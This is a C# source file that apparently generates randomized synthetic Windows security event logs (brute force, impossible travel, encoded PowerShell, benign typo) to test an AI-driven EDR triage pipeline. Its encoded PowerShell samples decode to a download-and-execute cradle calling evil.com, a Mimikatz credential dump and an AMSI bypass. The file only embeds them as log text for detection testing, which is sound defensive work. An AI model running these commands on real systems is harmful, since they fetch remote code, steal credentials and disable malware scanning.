// ==========================================================================
//  Sentinel EDR — RedTeamSimulator.cs
//  Polymorphic Red Team Engine: generates random, context-aware attack
//  scenarios to stress-test the Agentic AI reasoning pipeline.
//  Target: .NET 8.0
// ==========================================================================
//
//  SCENARIOS
//  ─────────
//  1. Brute Force      — Rapid failed logins (4625) from a malicious IP
//  2. Impossible Travel — Same user logs in from two countries in 5 min
//  3. PowerShell Attack — Event 4688 with encoded (-enc) payload
//  4. False Positive    — Single typo from an internal IP (should be SAFE)
//
//  Every field (IP, username, workstation, country, PID, port) is randomised
//  so the AI agent never sees the exact same log twice.
// ==========================================================================

using System;

namespace SentinelEDR
{
    public static class RedTeamSimulator
    {
        private static readonly Random Rng = new();

        // ==================================================================
        //  DATA ARRAYS — randomised per-scenario
        // ==================================================================

        private static readonly string[] MaliciousIps =
        {
            "203.0.113.50",   // RFC 5737 documentation range (safe to use)
            "198.51.100.23",
            "45.33.32.156",
            "185.220.101.34",
            "91.219.29.81",
            "77.247.181.163"
        };

        private static readonly string[] SafeIps =
        {
            "192.168.1.100", "10.0.0.15", "172.16.0.42",
            "192.168.50.1",  "10.10.10.25"
        };

        private static readonly string[] PrivilegedUsers =
        {
            "admin", "Administrator", "svc_backup", "SYSTEM", "sa", "root"
        };

        private static readonly string[] NormalUsers =
        {
            "john.doe", "jane.smith", "m.johnson", "a.williams", "bob"
        };

        private static readonly string[] AttackerWorkstations =
        {
            "ATTACKER-PC", "KALI-BOX", "UNKNOWN-PC", "PENTEST-01"
        };

        private static readonly string[] CorpWorkstations =
        {
            "WORKSTATION-07", "DESKTOP-USER01", "LAPTOP-JDOE", "SRV-DC01"
        };

        private static readonly string[] HostileCountries = { "CN", "RU", "KP", "IR" };
        private static readonly string[] FriendlyCountries = { "US", "GB", "DE", "CA" };

        // Base64-encoded demo payloads (decoded strings are harmless labels)
        private static readonly string[] EncodedPayloads =
        {
            // IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
            "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
            // Invoke-Mimikatz -DumpCreds
            "SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==",
            // [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA="
        };

        // ==================================================================
        //  PUBLIC API
        // ==================================================================

        /// <summary>
        /// Randomly selects and generates one of four attack scenarios.
        /// Returns (ScenarioName, EventXml) for display and AI analysis.
        /// </summary>
        public static (string ScenarioName, string EventXml) GenerateAttackScenario()
        {
            return Rng.Next(4) switch
            {
                0 => GenerateBruteForce(),
                1 => GenerateImpossibleTravel(),
                2 => GeneratePowerShellAttack(),
                3 => GenerateFalsePositive(),
                _ => GenerateBruteForce()
            };
        }

        // ==================================================================
        //  SCENARIO 1 — BRUTE FORCE (Event 4625)
        //  High volume of failed RDP logins from a malicious IP targeting
        //  a privileged account.  The AI should flag this as CRITICAL.
        // ==================================================================

        private static (string, string) GenerateBruteForce()
        {
            string ip          = Pick(MaliciousIps);
            string user        = Pick(PrivilegedUsers);
            string workstation = Pick(AttackerWorkstations);
            int    attempts    = Rng.Next(15, 50);
            int    port        = Rng.Next(40000, 65000);
            long   recordId    = Rng.Next(800000, 999999);

            string xml = $$"""
                <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
                  <System>
                    <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
                    <EventID>4625</EventID>
                    <Version>0</Version>
                    <Level>0</Level>
                    <Task>12544</Task>
                    <Opcode>0</Opcode>
                    <Keywords>0x8010000000000000</Keywords>
                    <TimeCreated SystemTime='{{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ss.fffffffZ}}'/>
                    <EventRecordID>{{recordId}}</EventRecordID>
                    <Correlation ActivityID='{00000000-0000-0000-0000-000000000000}'/>
                    <Execution ProcessID='612' ThreadID='1832'/>
                    <Channel>Security</Channel>
                    <Computer>DC-PROD-01.corp.local</Computer>
                    <Security/>
                  </System>
                  <EventData>
                    <Data Name='SubjectUserSid'>S-1-0-0</Data>
                    <Data Name='SubjectUserName'>-</Data>
                    <Data Name='SubjectDomainName'>-</Data>
                    <Data Name='SubjectLogonId'>0x0</Data>
                    <Data Name='TargetUserSid'>S-1-0-0</Data>
                    <Data Name='TargetUserName'>{{user}}</Data>
                    <Data Name='TargetDomainName'>CORP</Data>
                    <Data Name='Status'>0xC000006D</Data>
                    <Data Name='FailureReason'>%%2313</Data>
                    <Data Name='SubStatus'>0xC000006A</Data>
                    <Data Name='LogonType'>10</Data>
                    <Data Name='LogonProcessName'>User32</Data>
                    <Data Name='AuthenticationPackageName'>Negotiate</Data>
                    <Data Name='WorkstationName'>{{workstation}}</Data>
                    <Data Name='TransmittedServices'>-</Data>
                    <Data Name='LmPackageName'>-</Data>
                    <Data Name='KeyLength'>0</Data>
                    <Data Name='ProcessId'>0x0</Data>
                    <Data Name='ProcessName'>-</Data>
                    <Data Name='IpAddress'>{{ip}}</Data>
                    <Data Name='IpPort'>{{port}}</Data>
                  </EventData>
                  <RenderingInfo>
                    <Message>This is attempt {{attempts}} of a rapid brute-force attack against the '{{user}}' account from {{ip}}. {{attempts}} failed logon attempts have been recorded in the last 2 minutes.</Message>
                  </RenderingInfo>
                </Event>
                """;

            return ($"Brute Force ({attempts} attempts from {ip})", xml);
        }

        // ==================================================================
        //  SCENARIO 2 — IMPOSSIBLE TRAVEL (Event 4624 x2)
        //  Same user authenticated from two geographically distant
        //  countries within 5 minutes.  The AI should flag CRITICAL.
        // ==================================================================

        private static (string, string) GenerateImpossibleTravel()
        {
            string user     = Pick(NormalUsers);
            string ip1      = Pick(SafeIps);
            string ip2      = Pick(MaliciousIps);
            string country1 = Pick(FriendlyCountries);
            string country2 = Pick(HostileCountries);
            var    now       = DateTime.UtcNow;
            var    earlier   = now.AddMinutes(-5);

            string xml = $$"""
                <!-- IMPOSSIBLE TRAVEL DETECTION: Two logons for same user from different countries within 5 minutes -->
                <Events>
                  <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
                    <System>
                      <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
                      <EventID>4624</EventID>
                      <TimeCreated SystemTime='{{earlier:yyyy-MM-ddTHH:mm:ss.fffffffZ}}'/>
                      <EventRecordID>{{Rng.Next(800000, 999999)}}</EventRecordID>
                      <Channel>Security</Channel>
                      <Computer>DC-PROD-01.corp.local</Computer>
                    </System>
                    <EventData>
                      <Data Name='TargetUserName'>{{user}}</Data>
                      <Data Name='TargetDomainName'>CORP</Data>
                      <Data Name='LogonType'>3</Data>
                      <Data Name='IpAddress'>{{ip1}}</Data>
                      <Data Name='IpPort'>51234</Data>
                    </EventData>
                    <RenderingInfo>
                      <Message>Successful logon for CORP\{{user}} from {{ip1}} ({{country1}})</Message>
                    </RenderingInfo>
                  </Event>
                  <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
                    <System>
                      <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
                      <EventID>4624</EventID>
                      <TimeCreated SystemTime='{{now:yyyy-MM-ddTHH:mm:ss.fffffffZ}}'/>
                      <EventRecordID>{{Rng.Next(800000, 999999)}}</EventRecordID>
                      <Channel>Security</Channel>
                      <Computer>DC-PROD-01.corp.local</Computer>
                    </System>
                    <EventData>
                      <Data Name='TargetUserName'>{{user}}</Data>
                      <Data Name='TargetDomainName'>CORP</Data>
                      <Data Name='LogonType'>10</Data>
                      <Data Name='IpAddress'>{{ip2}}</Data>
                      <Data Name='IpPort'>62891</Data>
                    </EventData>
                    <RenderingInfo>
                      <Message>Successful logon for CORP\{{user}} from {{ip2}} ({{country2}}) — only 5 minutes after logon from {{country1}}. IMPOSSIBLE TRAVEL ALERT.</Message>
                    </RenderingInfo>
                  </Event>
                </Events>
                """;

            return ($"Impossible Travel ({user}: {country1} -> {country2})", xml);
        }

        // ==================================================================
        //  SCENARIO 3 — POWERSHELL ATTACK (Event 4688)
        //  Process creation event showing powershell.exe launched with
        //  -enc (encoded command) flag — classic LOLBIN red team technique.
        //  The AI should flag CRITICAL.
        // ==================================================================

        private static (string, string) GeneratePowerShellAttack()
        {
            string user      = Pick(PrivilegedUsers);
            string payload   = Pick(EncodedPayloads);
            string ip        = Pick(MaliciousIps);
            int    pid       = Rng.Next(1000, 9999);
            int    parentPid = Rng.Next(500, 999);

            string xml = $$"""
                <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
                  <System>
                    <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
                    <EventID>4688</EventID>
                    <Version>2</Version>
                    <Level>0</Level>
                    <Task>13312</Task>
                    <Opcode>0</Opcode>
                    <Keywords>0x8020000000000000</Keywords>
                    <TimeCreated SystemTime='{{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ss.fffffffZ}}'/>
                    <EventRecordID>{{Rng.Next(800000, 999999)}}</EventRecordID>
                    <Channel>Security</Channel>
                    <Computer>SRV-WEB-03.corp.local</Computer>
                  </System>
                  <EventData>
                    <Data Name='SubjectUserSid'>S-1-5-21-3623811015-3361044348-30300820-1013</Data>
                    <Data Name='SubjectUserName'>{{user}}</Data>
                    <Data Name='SubjectDomainName'>CORP</Data>
                    <Data Name='SubjectLogonId'>0x3E7</Data>
                    <Data Name='NewProcessId'>0x{{pid:X}}</Data>
                    <Data Name='NewProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
                    <Data Name='TokenElevationType'>%%1936</Data>
                    <Data Name='ProcessId'>0x{{parentPid:X}}</Data>
                    <Data Name='CommandLine'>powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -enc {{payload}}</Data>
                    <Data Name='TargetUserSid'>S-1-0-0</Data>
                    <Data Name='TargetUserName'>-</Data>
                    <Data Name='TargetDomainName'>-</Data>
                    <Data Name='TargetLogonId'>0x0</Data>
                    <Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data>
                    <Data Name='MandatoryLabel'>S-1-16-12288</Data>
                    <Data Name='IpAddress'>{{ip}}</Data>
                  </EventData>
                  <RenderingInfo>
                    <Message>A new process has been created. User '{{user}}' executed powershell.exe with an encoded command (-enc flag). This is a common technique used to obfuscate malicious payloads. Parent process: cmd.exe (PID {{parentPid}}). Source IP: {{ip}}</Message>
                  </RenderingInfo>
                </Event>
                """;

            return ($"PowerShell -enc Attack (PID {pid}, user: {user})", xml);
        }

        // ==================================================================
        //  SCENARIO 4 — FALSE POSITIVE (Event 4625, safe)
        //  A single failed logon from an internal IP — just a user who
        //  mistyped their password at the console.  The AI should
        //  correctly identify this as SAFE.
        // ==================================================================

        private static (string, string) GenerateFalsePositive()
        {
            string user        = Pick(NormalUsers);
            string ip          = Pick(SafeIps);
            string workstation = Pick(CorpWorkstations);
            int    port        = Rng.Next(49000, 65000);

            string xml = $$"""
                <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
                  <System>
                    <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
                    <EventID>4625</EventID>
                    <Version>0</Version>
                    <Level>0</Level>
                    <Task>12544</Task>
                    <Opcode>0</Opcode>
                    <Keywords>0x8010000000000000</Keywords>
                    <TimeCreated SystemTime='{{DateTime.UtcNow:yyyy-MM-ddTHH:mm:ss.fffffffZ}}'/>
                    <EventRecordID>{{Rng.Next(800000, 999999)}}</EventRecordID>
                    <Correlation ActivityID='{00000000-0000-0000-0000-000000000000}'/>
                    <Execution ProcessID='612' ThreadID='1832'/>
                    <Channel>Security</Channel>
                    <Computer>DC-PROD-01.corp.local</Computer>
                    <Security/>
                  </System>
                  <EventData>
                    <Data Name='SubjectUserSid'>S-1-0-0</Data>
                    <Data Name='SubjectUserName'>-</Data>
                    <Data Name='SubjectDomainName'>-</Data>
                    <Data Name='SubjectLogonId'>0x0</Data>
                    <Data Name='TargetUserSid'>S-1-0-0</Data>
                    <Data Name='TargetUserName'>{{user}}</Data>
                    <Data Name='TargetDomainName'>CORP</Data>
                    <Data Name='Status'>0xC000006D</Data>
                    <Data Name='FailureReason'>%%2313</Data>
                    <Data Name='SubStatus'>0xC000006A</Data>
                    <Data Name='LogonType'>2</Data>
                    <Data Name='LogonProcessName'>User32</Data>
                    <Data Name='AuthenticationPackageName'>Negotiate</Data>
                    <Data Name='WorkstationName'>{{workstation}}</Data>
                    <Data Name='TransmittedServices'>-</Data>
                    <Data Name='LmPackageName'>-</Data>
                    <Data Name='KeyLength'>0</Data>
                    <Data Name='ProcessId'>0x0</Data>
                    <Data Name='ProcessName'>-</Data>
                    <Data Name='IpAddress'>{{ip}}</Data>
                    <Data Name='IpPort'>{{port}}</Data>
                  </EventData>
                  <RenderingInfo>
                    <Message>A single failed logon attempt for user '{{user}}' from internal IP {{ip}} on workstation {{workstation}}. LogonType 2 (Interactive / local console). This appears to be a normal password mistype by the user at their own workstation.</Message>
                  </RenderingInfo>
                </Event>
                """;

            return ($"False Positive (typo by {user} @ {ip})", xml);
        }

        // ==================================================================
        //  UTILITY
        // ==================================================================

        private static string Pick(string[] array) => array[Rng.Next(array.Length)];
    }
}
